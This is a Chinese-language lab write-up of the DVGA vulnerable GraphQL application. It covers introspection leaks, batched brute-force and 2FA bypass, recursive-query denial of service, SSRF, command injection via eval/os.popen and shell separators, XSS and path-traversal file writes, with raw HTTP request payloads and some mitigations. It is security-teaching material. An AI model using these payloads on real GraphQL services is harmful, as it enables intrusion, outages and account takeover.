---
title: "Attacking GraphQL——从DVGA靶场学习GraphQL安全"
slug: ps5n3g
translationKey: ps5n3g
date: 2021-04-28T17:29:00+08:00
source: yuque/penetration
---

# 0x00 背景
首先介绍一下：什么是GraphQL，参考这篇文章即可

> See:[https://zhuanlan.zhihu.com/p/124019191](https://zhuanlan.zhihu.com/p/124019191)、
>

<font style="color:rgb(18, 18, 18);">客户端首先与GraphQL进行交互，后者又与任意代码进行交互，并最终结束与数据库的对话。描述这种情况的图是：</font>

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1619602167147-21303751-5952-44c2-90ef-34cef79ca79f.png)

<font style="color:rgb(18, 18, 18);">架构的这种变化具有很多优势，例如：</font>

1. <font style="color:rgb(18, 18, 18);">可以在单个请求中获得客户端所需的所有数据（而REST API需要执行多个请求）</font>
2. <font style="color:rgb(18, 18, 18);">使用一个Endpoint（URL）即可处理多种请求。</font>



## 自省
> Introspection allows us to get information about all the Requests, Mutations, Subscriptions, and Data Types and all other things that are made available to the clients making requestsThis information is easily available by requesting `___schema` meta-field, which, according to the specification, is always available to the query of the “root” type.
>
> GraphQL通过使用其 Introspection 来允许获得有关服务器可用查询的类型，字段，突变等的信息。可以通过请求`___schema`元字段轻松获得此信息，根据规范，该字段始终可用于“`root`”类型的查询。
>
> See: [https://graphql.org/learn/introspection/](https://graphql.org/learn/introspection/)、
>

自省机制会带来什么问题呢？

首先，并非所有实现都遵循规范。如[这里](https://lab.wallarm.com/why-and-how-to-disable-introspection-query-for-graphql-apis/)是关闭GraphQL自省的方法，但还有很多实现是不具备关闭自省这种能力的。

其次，是信息泄露，自省会带来信息泄露的问题，将在后续的内容中做介绍。

## 靶场介绍
这一块GraphQL的靶场，名字叫DVGA（Damn-Vulnerable-GraphQL-Application），是Django写的项目

我这边采用的当然是docker安装（安全第一）

```markdown
# Pull the docker image from Docker Hub
docker pull dolevf/dvga

# Create a container from the image
docker run -t -p 80:5000 -e WEB_HOST=0.0.0.0 dolevf/dvga
```

下面，则是对靶场[https://github.com/dolevf/Damn-Vulnerable-GraphQL-Application](https://github.com/dolevf/Damn-Vulnerable-GraphQL-Application)的笔记

---

# 0x01 DoS攻击
下面是三种攻击场景

## （1）批量查询攻击 
Batching Attacks 

> <font style="color:rgba(0, 0, 0, 0.74);">See：</font>[https://lab.wallarm.com/graphql-batching-attack/](https://lab.wallarm.com/graphql-batching-attack/)
>
> <font style="color:rgba(0, 0, 0, 0.74);">One of these documented but not commonly used behaviors is the ability to send multiple queries with a single GraphQL request,</font>[a.k.a. batching](https://blog.apollographql.com/batching-client-graphql-queries-a685f5bcd41b)<font style="color:rgba(0, 0, 0, 0.74);">—something never explored by security researchers before. We will call attempts to explore this behavior</font>_**<font style="color:rgba(0, 0, 0, 0.74);">“GraphQL Batching Attacks”</font>**_<font style="color:rgba(0, 0, 0, 0.74);">.</font>
>
> 这些已记录但不常用的行为之一是能够通过单个GraphQL请求（即批处理、批量查询）发送多个查询，这是安全研究人员以前从未探索过的功能。我们将尝试探索这种行为的尝试称为“ GraphQL批处理攻击”。
>

定义

> <font style="color:rgba(0, 0, 0, 0.74);">See：</font>[https://graphql.org/learn/best-practices/#server-side-batching-caching](https://graphql.org/learn/best-practices/#server-side-batching-caching)
>
> GraphQL is designed in a way that allows you to write clean code on the server, where every field on every type has a focused single-purpose function for resolving that value. However, without additional consideration, a naive GraphQL service could be very “chatty” or repeatedly load data from your databases.
>
> This is commonly solved by a batching technique, where multiple requests for data from a backend are collected over a short period of time and then dispatched in a single request to an underlying database or microservice by using a tool like Facebook’s DataLoader.
>
> 
>
> GraphQL的设计方式允许您在服务器上编写简洁的代码，其中每种类型的每个字段都具有用于解决该值的集中的单一用途功能。但是，如果没有其他考虑，天真的GraphQL服务可能非常“闲谈”，或者反复从数据库中加载数据。
>
> 
>
> 这通常通过批处理技术来解决，该技术在短时间内收集来自后端的多个数据请求，然后使用Facebook的DataLoader之类的工具将单个请求分派到基础数据库或微服务。
>

要点：多条查询、一次发送。

`Batching 批量查询`大体上有三种实现方式，完整的内容在[https://www.apollographql.com/blog/query-batching-in-apollo-63acfd859862/](https://www.apollographql.com/blog/query-batching-in-apollo-63acfd859862/)文章中有介绍，此处主要关注——**Transport-level batching（传输级批处理）**

在大多数的GraphQL服务器中，请求以以下形式发送：

```http
{
  "query": “< query string goes here >”,
  "variables": {
    <variable values go here>
  }
}
```

然后，GraphQL服务器解析查询字符串并返回单个结果。

相反，假设我们提交了一个看起来像这样的请求：

```http
[
  {
    query: < query 0 >,
    variables: < variables for query 0 >,
  },
  {
    query: < query 1 >,
    variables: < variables for query 1 >,
  },
  {
    query: < query n >
    variables: < variables for query n >,
  }
]
```

服务器将返回如下响应：

```http
[
  <result for query 0>,
  <result for query 1>,
  ...
  <result for query n>
]
```

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1619664293829-241647d2-ba92-4329-b4b8-21f13b6380e5.png)

**安全风险**

主要是用于**绕过限制、滥用速率**（bypassing limits and abusing rates）

首先，与用户身份验证配合使用的测试操作，必须引入尝试次数的限制。如果单个API调用可以请求10000次输入密码，2FA令牌等的尝试，那么如何限制尝试次数？（按：推测是GraphQL本身不具备限制请求次数的能力） 很显然，此检查将需要在代码级别进行，并且由开发人员来验证许多此类尝试。这是发生错误和不一致的理想场所。根据墨菲定律-“任何可能出错的地方都会出错”。

其次，对于负责保护Web应用程序（例如WAF和RASP）安全的工具，当每个API请求都可以封装构成攻击的数千个恶意请求时，要识别异常的服务器活动是一项挑战。

对于已经非常熟悉应用程序安全性的人来说，了解此攻击媒介的一种简单方法是将其与困扰WordPress多年的[XMLRPC Bruteforce Amplification](https://nitesculucian.github.io/2019/07/01/exploiting-the-xmlrpc-php-on-all-wordpress-versions/#brute-force-attacks)进行比较。攻击批量查询非常相似，但对于GraphQL，不仅如此。

### 密码暴力破解
通过GraphQL API进行身份验证，同时发送许多具有不同凭据的查询以对其进行检查。这是一种经典的蛮力攻击，但是由于GraphQL批处理功能，**现在每个HTTP请求可以发送多个登录名/密码对**。这种方法会使外部速率监视应用程序认为一切都很好，不会发现有蛮力攻击正在猜测密码。 

在下面，您可以找到应用程序身份验证请求的最简单演示，一次具有3个不同的电子邮件/密码对。显然，有可能以相同的方式在单个请求中发送数千个：

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1619663761156-8f66cbfe-c854-4bc0-b968-f388ee4e425b.png)

从响应屏幕快照中可以看到，第一个和第三个请求返回null并在错误部分反映了相应的信息。第二次请求中具有正确的身份验证数据，并且响应具有正确的身份验证会话令牌。

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1619663785632-717036c4-a24e-45e2-8fe4-67c945dd76b5.png)

简而言之，GraphQL允许我们发送多个变异请求以接收应用程序的会话身份验证，并尝试多次尝试猜测正确的密码。 

```http
POST /graphql HTTP/1.1
Host: dvga
Content-Length: 101
Accept: application/json
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4371.0 Safari/537.36
Content-Type: application/json
Origin: http://dvga
Referer: http://dvga/my_pastes
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: session=eyJkaWZmaWN1bHR5IjoiZWFzeSJ9.YKTdFg.gxo7zovzYI-WIWb3kior9oodnw8; env=Z3JhcGhpcWw6ZGlzYWJsZQ==
Connection: close

{"query":"query {      systemDiagnostics(username:\"admin\", password:\"letmein\", cmd:\"id\")    }"}
```

爆破，得知密码。

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1621478523995-f11cda82-1f57-4138-a12c-7d8b892697e7.png)

### 2FA绕过
虽然应用程序身份验证是由GraphQL完成的，但实现两因素身份验证（2FA）并不少见。使用GraphQL批处理攻击，可以通过在单个请求中发送所有令牌变体来完全绕过常见的第二身份验证因素之一OTP（一次性密码）。

 您可以在下面找到此GraphQL请求示例：

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1619664130648-087cfc33-91ac-410f-bbd2-f08b0d054e87.png)

响应屏幕截图显示了响应单个请求同时输入OTP的三种尝试。正确的代码仅在第三个突变中传输，而第一个和第二个突变均返回null并在错误部分中反映相应的信息

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1619664141505-889e1d77-a15d-41c9-95a4-430a7f2a3c26.png)

请注意，易受攻击的GraphQL Web应用程序同时处理所有3个“一次性”令牌，找到了有效的令牌，然后将我们登录到内部。 

---

## （2）资源密集型查询攻击
Resource Intensive Query Attack

举个在漏洞靶场[Damn-Vulnerable-GraphQL-Application](https://github.com/dolevf/Damn-Vulnerable-GraphQL-Application/issues)中的例子，通过发送多个`systemUpdate`查询，让服务器

```http
[
    {"query":"query {\n  systemUpdate\n}","variables":[]},
    {"query":"query {\n  systemUpdate\n}","variables":[]},
    {"query":"query {\n  systemUpdate\n}","variables":[]}
    ]
```

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1619664410785-181e9856-c663-46b7-9265-513382bb1ef8.png)

---

## （3）深度递归查询攻击
Deep Recursion Query Attack

> 在GraphQL中，当类型相互引用时，通常可以建立循环查询，该查询以指数方式增长到可以使服务器瘫痪的地步。诸如此类的对策`max_depth` 可以帮助减轻这些类型的攻击。
>

在GraphQL调用中使用以下主体，您可以无限期地增加嵌套级别的数量，每次都会得到指数级更大的响应。

```http
query allSchemaTypes {  
    __schema {  
        types {  
            fields {  
                type{  
                    fields {  
                        type {  
                            fields {  
                                type {  
                                    fields {  
                                        name  
                                    }  
                                }  
                            }  
                        }  
                    }  
                }  
            }  
        }  
    }  
}
```

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1619680010813-39ceac6e-c486-4fec-b915-0159b54bfac5.png)

假如弄个更多层数的嵌套，服务器直接崩掉【注意安全】

```http
query allSchemaTypes { __schema { types { fields { type{ fields { type { fields { type { fields { type { fields { type { fields { type { fields { type { fields { type { fields { type { fields { type { fields { type { fields { type { fields { type { fields { type { fields { type { fields { type { fields { type { fields { type { fields { type { fields { type { fields { type { fields { type { fields { type { fields { type { fields { type { fields { name } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } 
```

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1619680246287-cb0d6468-3f67-4364-b2cb-e736a978d594.png)

此时的logs

[Log_DoS_GraphQL.txt](https://www.yuque.com/attachments/yuque/0/2021/txt/166008/1619681257396-4cb77c1c-5f32-49d0-bbe6-cfb51114ec86.txt)

---



## （4）修复方案
关于**递归查询**的修复方案，开发同学可以参考：[https://gitlab.com/gitlab-org/gitlab/-/issues/30096](https://gitlab.com/gitlab-org/gitlab/-/issues/30096)，基本上建议如下：

+ 关闭生产环境中的自省（turn off introspective queries in production）
+ 可以对深度（嵌套级别），复杂性，查询大小等进行速率限制（you can either rate limit on depth (levels of nesting), on complexity, on query size and so on），这种限制需要在代码层做好设计，可以考虑增加深度限制，使用`graphql-depth-limit`模块查询数量限制；或者使用`graphql-input-number`创建一个标量，设置最大为100

# 0x02 信息泄露
## Information Disclosure
> GraphQL内省是一个特殊查询，使用该__schema字段为其架构查询GraphQL。
>
> 内省本身不是弱点，而是功能。但是，如果将其提供，则攻击者可能会使用它并滥用它，以寻求有关GraphQL实现的信息，例如存在哪些查询或变异。
>

首先，执行以下查询

```basic
{"query":"\n    query IntrospectionQuery {\r\n      __schema {\r\n        queryType { name }\r\n        mutationType { name }\r\n        subscriptionType { name }\r\n        types {\r\n          ...FullType\r\n        }\r\n        directives {\r\n          name\r\n          description\r\n          locations\r\n          args {\r\n            ...InputValue\r\n          }\r\n        }\r\n      }\r\n    }\r\n\r\n    fragment FullType on __Type {\r\n      kind\r\n      name\r\n      description\r\n      fields(includeDeprecated: true) {\r\n        name\r\n        description\r\n        args {\r\n          ...InputValue\r\n        }\r\n        type {\r\n          ...TypeRef\r\n        }\r\n        isDeprecated\r\n        deprecationReason\r\n      }\r\n      inputFields {\r\n        ...InputValue\r\n      }\r\n      interfaces {\r\n        ...TypeRef\r\n      }\r\n      enumValues(includeDeprecated: true) {\r\n        name\r\n        description\r\n        isDeprecated\r\n        deprecationReason\r\n      }\r\n      possibleTypes {\r\n        ...TypeRef\r\n      }\r\n    }\r\n\r\n    fragment InputValue on __InputValue {\r\n      name\r\n      description\r\n      type { ...TypeRef }\r\n      defaultValue\r\n    }\r\n\r\n    fragment TypeRef on __Type {\r\n      kind\r\n      name\r\n      ofType {\r\n        kind\r\n        name\r\n        ofType {\r\n          kind\r\n          name\r\n          ofType {\r\n            kind\r\n            name\r\n            ofType {\r\n              kind\r\n              name\r\n              ofType {\r\n                kind\r\n                name\r\n                ofType {\r\n                  kind\r\n                  name\r\n                  ofType {\r\n                    kind\r\n                    name\r\n                  }\r\n                }\r\n              }\r\n            }\r\n          }\r\n        }\r\n      }\r\n    }\r\n  ","variables":null}
```

将返回的响应粘贴到[https://apis.guru/graphql-voyager/](https://apis.guru/graphql-voyager/)

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1620381958074-b65cb9bc-f1f9-4133-8374-39e4cbfa2efe.png)

## GraphQL Field Suggestions
![](https://cdn.nlark.com/yuque/0/2021/png/166008/1621417669014-b79196f7-0cf9-4531-9371-276577109b80.png)





# 0x03 功能滥用
## （1）SSRF 
功能点如图：

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1621417951734-1f2dc330-063c-4fe0-8f7d-6200f1a148ec.png)

抓包，使用`gopher`、`dict`协议，均可实现SSRF

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1621417924694-97ef1804-6d31-4f4c-aaf4-8c05f6d99867.png)



## （2）命令注入
![](https://cdn.nlark.com/yuque/0/2021/png/166008/1621478987191-5a520119-cb1c-484e-97f9-60d6bec89ae5.png)

> See：[https://sethsec.blogspot.com/2016/11/exploiting-python-code-injection-in-web.html](https://sethsec.blogspot.com/2016/11/exploiting-python-code-injection-in-web.html)
>



实际上，根据代码[https://github.com/dolevf/Damn-Vulnerable-GraphQL-Application/blob/614a19549b25dc8fc0edfa2cd0cabe613422c0bb/core/views.py#L130](https://github.com/dolevf/Damn-Vulnerable-GraphQL-Application/blob/614a19549b25dc8fc0edfa2cd0cabe613422c0bb/core/views.py#L130)

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1621419111418-633142bb-8f4a-41fa-8777-0d55e612310c.png)

首先，考虑是`f-strings`，原本可以用

```basic
>>> f'''{eval(compile("__import__('os').popen('pwd').read()", '', 'single'))}'''
'/c/cmder_c\n'
'None'
```

完成命令注入。

但由于不能完全控制内容，所以不如直接用`os-cmd injection`，随便杀

```basic
``
||
;;
&&
```

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1621420024526-b5bfe204-54ae-4a50-9f28-dd215fc03810.png)

## （3）XSS
![](https://cdn.nlark.com/yuque/0/2021/png/166008/1621478970438-c704a226-54cc-48de-affc-d561dff7e7b3.png)

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1621478336356-ab38a541-f4cc-447e-aa6e-cb08882e48a1.png)

## （4）任意文件读取
![](https://cdn.nlark.com/yuque/0/2021/png/166008/1621478954652-8fcf4d41-57f1-484a-80f2-3d379e1110e6.png)

```http
POST /graphql HTTP/1.1
Host: dvga
Content-Length: 269
Accept: application/json
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4371.0 Safari/537.36
Content-Type: application/json
Origin: http://dvga
Referer: http://dvga/upload_paste
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: session=eyJkaWZmaWN1bHR5IjoiZWFzeSJ9.YKTdFg.gxo7zovzYI-WIWb3kior9oodnw8; env=Z3JhcGhpcWw6ZGlzYWJsZQ==
Connection: close

{"query":"mutation UploadPaste ($filename: String!, $content: String!) {\n          uploadPaste(filename: $filename, content:$content)\n          {\n            result\n          }\n        }","variables":{"content":"FILE_content","filename":"../../../../tmp/111.txt"}}
```

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1621478929628-56422392-f69f-4014-b939-2533e8f9316f.png)



# 0x04 利用工具
## inql
[https://github.com/doyensec/inql](https://github.com/doyensec/inql)

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1619680782137-46c08552-fd73-4199-bba6-c9cdfd57f8b6.png)

clone到本地后，打开bin目录即可，会在当前目录下生成对inql的整理结果，如图所示

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1621479144151-bc7e8273-275a-4ce3-a939-37031778ca8b.png)

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1621479303169-18a07bdb-8293-4e5d-821f-5f5fc9de28ab.png)



注意：这款工具对非80端口的支持不好，需要更改源码。

## GraphiQL接口查询结果可视化
[https://apis.guru/graphql-voyager/](https://apis.guru/graphql-voyager/)

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1621479350060-4e992b88-d007-482b-8062-9a0ffd959309.png)

②将查询语法粘贴到GraphiQL的console中，获取到查询结果，③再将结果粘贴回上图中的文本框中。即可得到下图所示的数据结构（PS：不知为何，有时候会失败）

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1621479606860-8365e44a-0075-4178-ad18-9538ff6c5ab4.png)

找到你感兴趣的实体，在inql生成的Query目录下，找到对应实体的查询语法，构造查询参数进行查询即可，例如，对于这条查询语法（作了转换的，原始的query不便于可视化）

```markdown
{"query": "query {
paste(pId:\"code\") {
	id
	title
	content
	public
	userAgent
	ipAddr
	ownerId
	burn
	pId
	owner {
		id
	}
	Owner {
		id
	}
}}"}
```

直接查询过去，当然是没有结果的，如下图所示

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1621480248982-2bba73ff-76e6-415e-9cae-5949bd43fac0.png)

将`pId`改成数字值，例如`1`，可以看到就返回结果了。

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1621480302521-d7e1831e-e0b6-45f7-9962-9b929c3a0a12.png)

更多的时候，我们需要根据简单的接口获取一些基本信息（如`hash`、`key`等配置值），才能有效地构造出参数。

## nmap
网上有师傅写了针对性利用的lua脚本，可以在下面的链接里查看，

See: [https://raw.githubusercontent.com/dolevf/nmap-graphql-introspection-nse/6594cce7b590a7194641494ed33c018d9ecd6b89/graphql-introspection.nse](https://raw.githubusercontent.com/dolevf/nmap-graphql-introspection-nse/6594cce7b590a7194641494ed33c018d9ecd6b89/graphql-introspection.nse)

使用前，放置到nmap安装目录的`scripts/`下，使用过程如下：

```http
λ nmap -sV dvga --script=graphql-introspection -p 80
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-29 18:42 ?D1ú±ê×?ê±??
Stats: 0:00:00 elapsed; 0 hosts completed (0 up), 1 undergoing Ping Scan
Ping Scan Timing: About 12.50% done; ETC: 18:42 (0:00:00 remaining)
Stats: 0:00:06 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 0.00% done
Nmap scan report for dvga (127.0.0.1:)
Host is up (0.031s latency).
rDNS record for 127.0.0.1: DVGA

PORT   STATE SERVICE VERSION
80/tcp open  http    Werkzeug httpd 1.0.1 (Python 3.7.9)
| graphql-introspection:
|   VULNERABLE:
|   GraphQL Server allows Introspection queries at endpoint: Endpoint: /graphql is vulnerable to introspection queries!
|     State: VULNERABLE
|       Checks if GraphQL allows Introspection Queries.
|
|     References:
|_      https://graphql.org/learn/introspection/
|_http-server-header: Werkzeug/1.0.1 Python/3.7.9

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.37 seconds

```



# Refs
+ [https://www.apollographql.com/blog/batching-client-graphql-queries-a685f5bcd41b/](https://www.apollographql.com/blog/batching-client-graphql-queries-a685f5bcd41b/)

[https://graphql.org/learn/introspection](https://graphql.org/learn/introspection/)

+ [https://blog.doyensec.com/2018/05/17/graphql-security-overview.html](https://blog.doyensec.com/2018/05/17/graphql-security-overview.html)
+ [https://www.apollographql.com/blog/query-batching-in-apollo-63acfd859862/](https://www.apollographql.com/blog/query-batching-in-apollo-63acfd859862/)
+ [https://lab.wallarm.com/graphql-batching-attack/](https://lab.wallarm.com/graphql-batching-attack/)
+ [https://zhuanlan.zhihu.com/p/124019191](https://zhuanlan.zhihu.com/p/124019191)
+ [https://apis.guru/graphql-voyager/](https://apis.guru/graphql-voyager/)
+  [玩转graphQL](https://mp.weixin.qq.com/s/gp2jGrLPllsh5xn7vn9BwQ)
+ [https://github.com/doyensec/inql](https://github.com/doyensec/inql)（安装容易出现问题，不是默认端口时的目录会异常）



